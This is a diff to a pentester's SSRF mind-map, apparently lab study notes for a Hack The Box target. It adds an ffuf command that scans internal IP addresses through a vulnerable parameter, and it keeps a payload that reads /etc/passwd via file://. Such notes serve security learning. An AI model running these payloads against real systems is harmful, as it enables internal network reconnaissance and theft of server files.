@@ -5,8 +5,7 @@
 ---
 
 **Overall:**
-```
-SSRF - Pentester Mindset Map
+```SSRF - Pentester Mindset Map
 ├── 1. Identify
 │   ├── Netcat Listener → Use your IP to catch outbound request
 │   └── Self-Reflect Test → http://127.0.0.1:PORT/index.php
@@ -23,6 +22,12 @@ SSRF - Pentester Mindset Map
 │   │       -H "Content-Type: application/x-www-form-urlencoded" \
 │   │       -d "dateserver=http://dateserver.htb/FUZZ.php&date=2024-01-01" \
 │   │       -fr "Server at dateserver.htb Port 80"
+│   │
+│   ├── IP Address Fuzzing
+│   │   └── ffuf -w .1to255.txt -u http://TARGET-IP/index.php -X POST \
+│   │       -H "Content-Type: application/x-www-form-urlencoded" \
+│   │       -d "dateserver=http://192.168.0.FUZZ/&date=2024-01-01" \
+│   │       -fr "Failed to connect to"
 │   │
 │   └── LFI via SSRF
 │       └── dateServer=file:///etc/passwd&date=2024-01-01
